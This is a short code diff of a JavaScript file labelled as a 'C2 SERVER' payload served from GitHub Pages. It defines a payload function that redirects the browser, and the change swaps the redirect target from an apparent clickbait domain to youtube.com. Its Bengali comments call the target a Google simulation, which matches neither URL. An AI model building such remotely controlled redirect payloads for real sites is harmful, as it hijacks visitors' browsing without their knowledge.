@@ -15,7 +15,7 @@ console.log("☣️ C2 SERVER: Payload loaded from GitHub Pages (HTTPS)");
 window.C2_PAYLOAD_ACTION = function() {
     
     // 🎯 নিরাপদ রিডাইরেক্ট টার্গেট (সিমুলেশনের জন্য Google ব্যবহার করা হচ্ছে)
-    var SAFE_REDIRECT_URL = "https://frevirals.com/viralvideos";
+    var SAFE_REDIRECT_URL = "https://www.youtube.com";
     
     if (CURRENT_PAYLOAD_VERSION === "v1") {
         // 🚀 V1: Redirect to a safe domain (Google)
